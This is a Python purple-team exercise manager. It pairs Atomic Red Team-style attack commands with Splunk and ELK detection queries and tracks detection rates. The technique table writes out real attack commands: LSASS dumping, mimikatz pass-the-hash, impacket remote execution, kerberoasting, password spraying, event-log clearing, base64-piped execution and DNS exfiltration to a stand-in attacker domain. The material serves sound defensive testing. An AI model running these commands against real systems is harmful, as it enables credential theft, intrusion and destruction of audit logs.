#!/usr/bin/env python3
"""Purple team exercise management — synchronized red+blue testing with Atomic Red Team integration"""
import json, os, sys
from datetime import datetime

ATOMIC_TESTS = [
    {"id": "T1059.001", "name": "PowerShell Execution", "tactic": "Execution",
     "attack_cmd_win": "powershell.exe -NoProfile -Command \"Write-Host 'Atomic Test'\"",
     "attack_cmd_linux": None,
     "detection_splunk": "index=sysmon EventCode=1 Image=\"*powershell.exe\" | table _time User CommandLine",
     "detection_elk": "process.name:\"powershell.exe\" AND event.code:1",
     "cleanup": "Remove-Item $env:TEMP\\atomic-test* -Force -ErrorAction SilentlyContinue",
     "description": "Execute a PowerShell command. Tests if PowerShell script block logging and process creation auditing detect the execution."},
    {"id": "T1059.003", "name": "Windows Command Shell", "tactic": "Execution",
     "attack_cmd_win": "cmd.exe /c \"echo Atomic Test > %TEMP%\\atomic-test.txt\"",
     "attack_cmd_linux": None,
     "detection_splunk": "index=sysmon EventCode=1 Image=\"*cmd.exe\" CommandLine=\"*echo*\" | table _time User CommandLine",
     "detection_elk": "process.name:\"cmd.exe\" AND process.command_line:*echo*",
     "cleanup": "del %TEMP%\\atomic-test.txt",
     "description": "Execute commands via cmd.exe. Tests command-line auditing and process creation monitoring."},
    {"id": "T1003.001", "name": "LSASS Memory Dump", "tactic": "Credential Access",
     "attack_cmd_win": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full",
     "attack_cmd_linux": None,
     "detection_splunk": "index=sysmon EventCode=10 TargetImage=\"*lsass.exe\" | table _time SourceImage TargetImage GrantedAccess",
     "detection_elk": "event.code:10 AND winlog.event_data.TargetImage:*lsass.exe",
     "cleanup": "Remove-Item $env:TEMP\\lsass.dmp -Force",
     "description": "Dump LSASS process memory to extract credentials. Tests Sysmon ProcessAccess (Event 10) and EDR credential theft detection."},
    {"id": "T1547.001", "name": "Registry Run Key Persistence", "tactic": "Persistence",
     "attack_cmd_win": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AtomicTest /t REG_SZ /d \"calc.exe\" /f",
     "attack_cmd_linux": None,
     "detection_splunk": "index=sysmon EventCode=13 TargetObject=\"*CurrentVersion\\\\Run*\" | table _time Image TargetObject Details",
     "detection_elk": "event.code:13 AND winlog.event_data.TargetObject:*CurrentVersion\\\\Run*",
     "cleanup": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AtomicTest /f",
     "description": "Add a registry Run key for persistence. Tests Sysmon RegistryEvent (Event 13) and registry monitoring."},
    {"id": "T1053.005", "name": "Scheduled Task Creation", "tactic": "Persistence",
     "attack_cmd_win": "schtasks /create /tn \"AtomicTest\" /tr \"calc.exe\" /sc once /st 23:59 /f",
     "attack_cmd_linux": None,
     "detection_splunk": "index=wineventlog EventCode=4698 | table _time SubjectUserName TaskName TaskContent",
     "detection_elk": "event.code:4698",
     "cleanup": "schtasks /delete /tn \"AtomicTest\" /f",
     "description": "Create a scheduled task. Tests Windows Security Event 4698 and task creation monitoring."},
    {"id": "T1053.003", "name": "Cron Job Persistence", "tactic": "Persistence",
     "attack_cmd_win": None,
     "attack_cmd_linux": "(crontab -l 2>/dev/null; echo '*/5 * * * * echo atomic_test') | crontab -",
     "detection_splunk": "index=linux sourcetype=syslog crontab OR CRON | search REPLACE OR INSTALL",
     "detection_elk": "process.name:crontab AND event.action:executed",
     "cleanup": "crontab -l | grep -v atomic_test | crontab -",
     "description": "Add a cron job for persistence on Linux. Tests cron monitoring and syslog analysis."},
    {"id": "T1046", "name": "Network Service Discovery", "tactic": "Discovery",
     "attack_cmd_win": "Test-NetConnection -ComputerName localhost -Port 445 -InformationLevel Quiet",
     "attack_cmd_linux": "nc -zv localhost 22 80 443 2>&1",
     "detection_splunk": "index=firewall | stats dc(dest_port) as ports by src_ip | where ports > 20",
     "detection_elk": "event.category:network AND event.action:connection_attempted | stats count by source.ip",
     "cleanup": None,
     "description": "Scan for open network services. Tests network-based detection for port scanning activity."},
    {"id": "T1087.001", "name": "Local Account Discovery", "tactic": "Discovery",
     "attack_cmd_win": "net user",
     "attack_cmd_linux": "cat /etc/passwd | grep -v nologin | grep -v false",
     "detection_splunk": "index=sysmon EventCode=1 CommandLine=\"*net user*\" OR CommandLine=\"*cat*/etc/passwd*\"",
     "detection_elk": "process.command_line:(*net*user* OR *cat*/etc/passwd*)",
     "cleanup": None,
     "description": "Enumerate local user accounts. Tests command-line monitoring for reconnaissance commands."},
    {"id": "T1087.002", "name": "Domain Account Discovery", "tactic": "Discovery",
     "attack_cmd_win": "net user /domain",
     "attack_cmd_linux": "ldapsearch -x -h DC_IP -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName 2>/dev/null | head -50",
     "detection_splunk": "index=sysmon EventCode=1 CommandLine=\"*net user*domain*\" | table _time User CommandLine",
     "detection_elk": "process.command_line:*net*user*/domain*",
     "cleanup": None,
     "description": "Enumerate domain user accounts. Tests LDAP query monitoring and command-line auditing."},
    {"id": "T1550.002", "name": "Pass the Hash", "tactic": "Lateral Movement",
     "attack_cmd_win": "mimikatz.exe \"sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe\"",
     "attack_cmd_linux": "impacket-psexec -hashes :NTLM_HASH admin@TARGET",
     "detection_splunk": "index=wineventlog EventCode=4624 Logon_Type=9 | table _time Account_Name Source_Network_Address",
     "detection_elk": "event.code:4624 AND winlog.event_data.LogonType:9",
     "cleanup": None,
     "description": "Authenticate using an NTLM hash. Tests logon event monitoring for type 9 (NewCredentials) logons."},
    {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "tactic": "Lateral Movement",
     "attack_cmd_win": "net use \\\\TARGET\\C$ /user:DOMAIN\\admin password",
     "attack_cmd_linux": "smbclient //TARGET/C$ -U 'DOMAIN\\admin%password'",
     "detection_splunk": "index=wineventlog EventCode=5140 ShareName=\"*C$*\" OR ShareName=\"*ADMIN$*\" | table _time Account_Name Source_Address ShareName",
     "detection_elk": "event.code:5140 AND winlog.event_data.ShareName:(*C$* OR *ADMIN$*)",
     "cleanup": "net use \\\\TARGET\\C$ /delete",
     "description": "Access admin shares on a remote system. Tests file share access auditing (Event 5140)."},
    {"id": "T1569.002", "name": "Service Execution (PsExec)", "tactic": "Execution",
     "attack_cmd_win": "psexec.exe \\\\TARGET cmd.exe",
     "attack_cmd_linux": "impacket-psexec admin:password@TARGET",
     "detection_splunk": "index=sysmon EventCode=1 ParentImage=\"*services.exe\" | where Image!=\"*svchost.exe\" | table _time Image CommandLine User",
     "detection_elk": "event.code:1 AND process.parent.name:services.exe AND NOT process.name:svchost.exe",
     "cleanup": None,
     "description": "Execute commands via PsExec service installation. Tests service creation events and unusual child processes of services.exe."},
    {"id": "T1047", "name": "WMI Execution", "tactic": "Execution",
     "attack_cmd_win": "wmic /node:TARGET process call create \"cmd.exe /c whoami > C:\\temp\\out.txt\"",
     "attack_cmd_linux": "impacket-wmiexec admin:password@TARGET",
     "detection_splunk": "index=sysmon EventCode=1 ParentImage=\"*wmiprvse.exe\" | table _time Image CommandLine User",
     "detection_elk": "event.code:1 AND process.parent.name:wmiprvse.exe",
     "cleanup": None,
     "description": "Execute commands via WMI. Tests for WMI process creation and wmiprvse.exe child processes."},
    {"id": "T1543.003", "name": "Windows Service Creation", "tactic": "Persistence",
     "attack_cmd_win": "sc create AtomicTestSvc binpath= \"cmd.exe /c echo atomic\" start= auto",
     "attack_cmd_linux": None,
     "detection_splunk": "index=wineventlog EventCode=7045 | table _time Service_Name Service_File_Name Service_Type Service_Start_Type",
     "detection_elk": "event.code:7045",
     "cleanup": "sc delete AtomicTestSvc",
     "description": "Create a Windows service for persistence. Tests System Event 7045 (service installed)."},
    {"id": "T1070.001", "name": "Clear Windows Event Logs", "tactic": "Defense Evasion",
     "attack_cmd_win": "wevtutil cl System",
     "attack_cmd_linux": None,
     "detection_splunk": "index=wineventlog EventCode=1102 | table _time Account_Name",
     "detection_elk": "event.code:1102",
     "cleanup": None,
     "description": "Clear Windows event logs. Tests Event 1102 (audit log cleared) detection."},
    {"id": "T1070.002", "name": "Clear Linux Logs", "tactic": "Defense Evasion",
     "attack_cmd_win": None,
     "attack_cmd_linux": "echo '' > /var/log/auth.log 2>/dev/null || truncate -s 0 /tmp/test.log",
     "detection_splunk": "index=linux sourcetype=syslog | where _raw=\"\" OR size=0",
     "detection_elk": "file.path:/var/log/* AND event.action:truncated",
     "cleanup": None,
     "description": "Clear or truncate Linux log files. Tests file integrity monitoring and log gap detection."},
    {"id": "T1027", "name": "Obfuscated Files or Information", "tactic": "Defense Evasion",
     "attack_cmd_win": "powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
     "attack_cmd_linux": "echo 'ZWNobyBhdG9taWNfdGVzdA==' | base64 -d | bash",
     "detection_splunk": "index=sysmon EventCode=1 CommandLine=\"*-EncodedCommand*\" OR CommandLine=\"*base64*-d*\" | table _time Image CommandLine",
     "detection_elk": "process.command_line:(*EncodedCommand* OR *base64*-d*)",
     "cleanup": None,
     "description": "Execute encoded/obfuscated commands. Tests detection of encoded PowerShell and base64 decoded execution."},
    {"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control",
     "attack_cmd_win": "certutil -urlcache -split -f http://example.com/test.txt %TEMP%\\test.txt",
     "attack_cmd_linux": "curl -o /tmp/test.txt http://example.com/test.txt 2>/dev/null || wget -O /tmp/test.txt http://example.com/test.txt",
     "detection_splunk": "index=sysmon EventCode=1 (CommandLine=\"*certutil*-urlcache*\" OR CommandLine=\"*curl*-o*\" OR CommandLine=\"*wget*-O*\") | table _time Image CommandLine",
     "detection_elk": "process.command_line:(*certutil*urlcache* OR *curl*-o* OR *wget*-O*)",
     "cleanup": "del %TEMP%\\test.txt 2>nul & rm -f /tmp/test.txt 2>/dev/null",
     "description": "Download a file using LOLBins. Tests detection of file download via certutil, curl, or wget."},
    {"id": "T1048.003", "name": "Exfiltration Over DNS", "tactic": "Exfiltration",
     "attack_cmd_win": "nslookup atomic-test-data.attacker-domain.com",
     "attack_cmd_linux": "dig atomic-test-data.attacker-domain.com",
     "detection_splunk": "index=dns | stats count dc(query) as unique_queries avg(len(query)) as avg_len by src_ip | where avg_len > 50 OR unique_queries > 100",
     "detection_elk": "dns.question.name:* | stats count by source.ip | where count > 100",
     "cleanup": None,
     "description": "Simulate DNS tunneling by making DNS queries. Tests DNS query monitoring for anomalous patterns."},
    {"id": "T1558.003", "name": "Kerberoasting", "tactic": "Credential Access",
     "attack_cmd_win": "Rubeus.exe kerberoast /outfile:hashes.txt",
     "attack_cmd_linux": "impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/user:password",
     "detection_splunk": "index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17 | stats count by Account_Name Service_Name",
     "detection_elk": "event.code:4769 AND winlog.event_data.TicketEncryptionType:0x17",
     "cleanup": "del hashes.txt",
     "description": "Request TGS tickets for service accounts and crack them offline. Tests Kerberos ticket request monitoring (Event 4769 with RC4 encryption)."},
    {"id": "T1110.003", "name": "Password Spraying", "tactic": "Credential Access",
     "attack_cmd_win": "net use \\\\DC /user:DOMAIN\\user1 Password123",
     "attack_cmd_linux": "crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success",
     "detection_splunk": "index=wineventlog EventCode=4625 | stats count by Account_Name src_ip | where count > 5",
     "detection_elk": "event.code:4625 | stats count by user.name, source.ip | where count > 5",
     "cleanup": None,
     "description": "Try one password against many accounts. Tests failed logon monitoring (Event 4625) and lockout detection."},
]

EXERCISE_TEMPLATES = [
    {"name": "Quick Check", "duration": "30 min", "techniques": ["T1059.001", "T1087.001", "T1547.001", "T1046", "T1105", "T1070.001", "T1003.001", "T1027", "T1053.005", "T1087.002"]},
    {"name": "Credential Attack Drill", "duration": "1 hour", "techniques": ["T1003.001", "T1558.003", "T1110.003", "T1550.002", "T1087.002", "T1046"]},
    {"name": "Endpoint Detection Test", "duration": "2 hours", "techniques": ["T1059.001", "T1059.003", "T1547.001", "T1053.005", "T1543.003", "T1003.001", "T1027", "T1105", "T1070.001", "T1070.002", "T1087.001", "T1087.002"]},
    {"name": "Lateral Movement Drill", "duration": "1.5 hours", "techniques": ["T1550.002", "T1021.002", "T1569.002", "T1047", "T1046"]},
    {"name": "Full Assessment", "duration": "Full day", "techniques": [t["id"] for t in ATOMIC_TESTS]},
    {"name": "Ransomware Readiness", "duration": "2 hours", "techniques": ["T1059.001", "T1059.003", "T1547.001", "T1053.005", "T1543.003", "T1003.001", "T1550.002", "T1021.002", "T1569.002", "T1070.001", "T1105"]},
]

INDUSTRY_BENCHMARKS = {
    "detection_rate": {"average": 0.54, "top_quartile": 0.78, "bottom_quartile": 0.31},
    "mttd_minutes": {"average": 45, "top_quartile": 15, "bottom_quartile": 120},
    "blind_spot_pct": {"average": 0.38, "top_quartile": 0.15, "bottom_quartile": 0.60},
}

MATURITY_LEVELS = [
    {"level": 0, "name": "Initial", "detection_rate": "< 20%", "description": "Ad-hoc detection, no formal processes"},
    {"level": 1, "name": "Managed", "detection_rate": "20-40%", "description": "Basic SIEM, some detection rules, reactive"},
    {"level": 2, "name": "Defined", "detection_rate": "40-60%", "description": "Formal processes, regular testing, proactive hunting"},
    {"level": 3, "name": "Quantitatively Managed", "detection_rate": "60-80%", "description": "Metrics-driven, continuous improvement, automated response"},
    {"level": 4, "name": "Optimizing", "detection_rate": "> 80%", "description": "Advanced analytics, ML-driven, predictive capabilities"},
]


class PurpleTeam:
    name = "Purple Team Exercise Manager"
    description = "Synchronized red+blue testing with Atomic Red Team integration and detection coverage tracking"
    category = "defense"
    mitre = ["TA0001", "TA0002", "TA0003", "TA0004", "TA0005", "TA0006", "TA0007", "TA0008", "TA0009", "TA0010", "TA0011"]

    def __init__(self, target=None, options=None):
        self.target = target
        self.options = options or {}
        self.findings = []
        self.results = {}
        self.exercise_start = None

    def run(self, confirm_fn=None):
        confirm = confirm_fn or (lambda msg: input(f"\n[CONFIRM] {msg} [y/N]: ").strip().lower() == "y")
        print("\n" + "=" * 60)
        print("  PURPLE TEAM OPERATIONS CENTER")
        print("=" * 60)
        while True:
            print("\n  [1] Browse Atomic Tests ({} available)".format(len(ATOMIC_TESTS)))
            print("  [2] Start Exercise (from template)")
            print("  [3] Custom Exercise")
            print("  [4] View Results / Coverage")
            print("  [5] Generate Report")
            print("  [6] Benchmark Comparison")
            print("  [0] Exit")
            choice = input("\n  Select: ").strip()
            if choice == "1":
                self._browse_tests()
            elif choice == "2":
                self._start_exercise()
            elif choice == "3":
                self._custom_exercise()
            elif choice == "4":
                self._view_results()
            elif choice == "5":
                self._generate_report()
            elif choice == "6":
                self._benchmark()
            elif choice == "0":
                break

    def _browse_tests(self):
        tactics = sorted(set(t["tactic"] for t in ATOMIC_TESTS))
        print("\n  --- Atomic Red Team Tests ---")
        for tactic in tactics:
            tests = [t for t in ATOMIC_TESTS if t["tactic"] == tactic]
            print(f"\n  [{tactic}]")
            for t in tests:
                print(f"    {t['id']} - {t['name']}")
        tid = input("\n  Enter technique ID for details (or Enter to go back): ").strip()
        test = next((t for t in ATOMIC_TESTS if t["id"] == tid), None)
        if test:
            print(f"\n  === {test['id']}: {test['name']} ===")
            print(f"  Tactic: {test['tactic']}")
            print(f"  Description: {test['description']}")
            if test.get("attack_cmd_win"):
                print(f"\n  Red Team (Windows):")
                print(f"    $ {test['attack_cmd_win']}")
            if test.get("attack_cmd_linux"):
                print(f"\n  Red Team (Linux):")
                print(f"    $ {test['attack_cmd_linux']}")
            print(f"\n  Blue Team Detection (Splunk):")
            print(f"    {test['detection_splunk']}")
            print(f"\n  Blue Team Detection (ELK):")
            print(f"    {test['detection_elk']}")
            if test.get("cleanup"):
                print(f"\n  Cleanup:")
                print(f"    $ {test['cleanup']}")

    def _start_exercise(self):
        print("\n  --- Exercise Templates ---")
        for i, tmpl in enumerate(EXERCISE_TEMPLATES, 1):
            print(f"  [{i}] {tmpl['name']} ({tmpl['duration']}, {len(tmpl['techniques'])} techniques)")
        choice = input("\n  Select template: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(EXERCISE_TEMPLATES):
            tmpl = EXERCISE_TEMPLATES[int(choice) - 1]
            print(f"\n  Starting exercise: {tmpl['name']}")
            print(f"  Duration: {tmpl['duration']}")
            print(f"  Techniques: {len(tmpl['techniques'])}")
            self.exercise_start = datetime.now()
            self._run_exercise(tmpl["techniques"])

    def _custom_exercise(self):
        print("\n  Enter technique IDs (comma-separated):")
        ids = input("  > ").strip().split(",")
        ids = [i.strip() for i in ids if i.strip()]
        if ids:
            self.exercise_start = datetime.now()
            self._run_exercise(ids)

    def _run_exercise(self, technique_ids):
        tests = [t for t in ATOMIC_TESTS if t["id"] in technique_ids]
        if not tests:
            print("  No matching tests found.")
            return
        for i, test in enumerate(tests, 1):
            print(f"\n  [{i}/{len(tests)}] {test['id']}: {test['name']}")
            print(f"  Tactic: {test['tactic']}")
            if test.get("attack_cmd_win"):
                print(f"  Attack (Win): {test['attack_cmd_win'][:80]}")
            if test.get("attack_cmd_linux"):
                print(f"  Attack (Lin): {test['attack_cmd_linux'][:80]}")
            print(f"\n  Execute the attack, then mark the result:")
            print(f"    [d] Detected  [m] Missed  [s] Skip  [q] Quit exercise")
            result = input("  > ").strip().lower()
            if result == "q":
                break
            elif result == "d":
                mttd = input("  Time to detect (minutes, or Enter for unknown): ").strip()
                self.results[test["id"]] = {"status": "detected", "mttd": int(mttd) if mttd.isdigit() else None, "timestamp": datetime.now().isoformat()}
                print(f"  [DETECTED] {test['name']}")
            elif result == "m":
                self.results[test["id"]] = {"status": "missed", "mttd": None, "timestamp": datetime.now().isoformat()}
                print(f"  [MISSED] {test['name']}")
            else:
                self.results[test["id"]] = {"status": "skipped", "mttd": None, "timestamp": datetime.now().isoformat()}

    def _view_results(self):
        if not self.results:
            print("\n  No results yet. Run an exercise first.")
            return
        detected = sum(1 for r in self.results.values() if r["status"] == "detected")
        missed = sum(1 for r in self.results.values() if r["status"] == "missed")
        skipped = sum(1 for r in self.results.values() if r["status"] == "skipped")
        total = detected + missed
        rate = (detected / total * 100) if total > 0 else 0
        mttd_values = [r["mttd"] for r in self.results.values() if r.get("mttd") is not None]
        avg_mttd = sum(mttd_values) / len(mttd_values) if mttd_values else 0

        print(f"\n  === Detection Coverage ===")
        print(f"  Detected: {detected}  Missed: {missed}  Skipped: {skipped}")
        print(f"  Detection Rate: {rate:.1f}%")
        if mttd_values:
            print(f"  Average MTTD: {avg_mttd:.1f} minutes")

        # Per-tactic breakdown
        tactics = {}
        for tid, result in self.results.items():
            test = next((t for t in ATOMIC_TESTS if t["id"] == tid), None)
            if not test or result["status"] == "skipped":
                continue
            tactic = test["tactic"]
            if tactic not in tactics:
                tactics[tactic] = {"detected": 0, "total": 0}
            tactics[tactic]["total"] += 1
            if result["status"] == "detected":
                tactics[tactic]["detected"] += 1

        print(f"\n  --- Per-Tactic Coverage ---")
        for tactic, data in sorted(tactics.items()):
            pct = data["detected"] / data["total"] * 100 if data["total"] > 0 else 0
            bar = "#" * int(pct / 5) + "-" * (20 - int(pct / 5))
            print(f"  {tactic:25s} [{bar}] {pct:.0f}% ({data['detected']}/{data['total']})")

        # Blind spots
        blind = [tid for tid, r in self.results.items() if r["status"] == "missed"]
        if blind:
            print(f"\n  --- Blind Spots ({len(blind)}) ---")
            for tid in blind:
                test = next((t for t in ATOMIC_TESTS if t["id"] == tid), None)
                if test:
                    print(f"    {test['id']}: {test['name']} ({test['tactic']})")

        # Maturity assessment
        maturity = next((m for m in reversed(MATURITY_LEVELS) if rate >= int(m["detection_rate"].split("-")[0].replace("< ", "").replace("> ", "").replace("%", ""))), MATURITY_LEVELS[0])
        print(f"\n  SOC Maturity Level: {maturity['level']} - {maturity['name']}")
        print(f"  {maturity['description']}")

    def _generate_report(self):
        if not self.results:
            print("\n  No results to report.")
            return
        detected = sum(1 for r in self.results.values() if r["status"] == "detected")
        missed = sum(1 for r in self.results.values() if r["status"] == "missed")
        total = detected + missed
        rate = (detected / total * 100) if total > 0 else 0

        print("\n  === PURPLE TEAM EXERCISE REPORT ===")
        print(f"  Date: {datetime.now().strftime('%Y-%m-%d')}")
        print(f"  Techniques Tested: {total}")
        print(f"  Detection Rate: {rate:.1f}%")
        print(f"  Detected: {detected} | Missed: {missed}")
        print()
        print("  FINDINGS:")
        for tid, result in self.results.items():
            test = next((t for t in ATOMIC_TESTS if t["id"] == tid), None)
            if test and result["status"] == "missed":
                print(f"  [GAP] {test['id']}: {test['name']}")
                print(f"        Tactic: {test['tactic']}")
                print(f"        Detection query needed: {test['detection_splunk'][:80]}")
                print()
        print("  RECOMMENDATIONS:")
        print("  1. Implement detection rules for all missed techniques")
        print("  2. Tune existing rules to reduce false positives")
        print("  3. Schedule monthly purple team exercises")
        print("  4. Track improvement over time")

    def _benchmark(self):
        if not self.results:
            print("\n  No results to benchmark. Run an exercise first.")
            return
        detected = sum(1 for r in self.results.values() if r["status"] == "detected")
        missed = sum(1 for r in self.results.values() if r["status"] == "missed")
        total = detected + missed
        rate = detected / total if total > 0 else 0

        print("\n  === Industry Benchmark Comparison ===")
        print(f"\n  Your detection rate: {rate*100:.1f}%")
        print(f"  Industry average:    {INDUSTRY_BENCHMARKS['detection_rate']['average']*100:.0f}%")
        print(f"  Top quartile:        {INDUSTRY_BENCHMARKS['detection_rate']['top_quartile']*100:.0f}%")
        print(f"  Bottom quartile:     {INDUSTRY_BENCHMARKS['detection_rate']['bottom_quartile']*100:.0f}%")
        if rate >= INDUSTRY_BENCHMARKS["detection_rate"]["top_quartile"]:
            print("  --> You are in the TOP QUARTILE")
        elif rate >= INDUSTRY_BENCHMARKS["detection_rate"]["average"]:
            print("  --> You are ABOVE AVERAGE")
        elif rate >= INDUSTRY_BENCHMARKS["detection_rate"]["bottom_quartile"]:
            print("  --> You are BELOW AVERAGE")
        else:
            print("  --> You are in the BOTTOM QUARTILE — significant gaps exist")

    def get_findings(self):
        return self.findings


if __name__ == "__main__":
    p = PurpleTeam()
    p.run()
